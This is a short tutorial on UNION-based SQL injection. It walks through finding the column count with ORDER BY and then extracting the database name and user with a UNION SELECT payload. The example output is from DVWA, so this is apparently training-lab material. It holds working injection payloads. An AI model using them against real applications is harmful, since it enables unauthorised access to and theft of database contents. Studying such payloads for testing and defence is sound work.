Systematic Data Extraction

UNION-based SQLi combines malicious query results with legitimate ones, allowing data extraction when application displays query output.

Step 1: Determine Column Count

Use ORDER BY N--+, incrementing N until an error occurs, indicating the correct number of columns.

Step 2: Extract Data with UNION SELECT

Once column count is known, use UNION SELECT 1,database(),user()--+ (adjusting placeholders) to retrieve specific information.

Key Takeaway

UNION-based SQLi is a powerful technique for mapping database structure and extracting sensitive data, requiring careful column matching.

UNION-Based SQLi Payloads

// Determining column count:
' ORDER BY 1--+
' ORDER BY 2--+
...
' ORDER BY N--+  // (until an error indicates N is too high)

The --+ comments out the rest of the original query, preventing syntax errors.

// Extracting data (assuming 3 columns):
' UNION SELECT 1,database(),user()--+

// Example output:
1 | dvwa | root@localhost

This payload attempts to display the current database name and user.
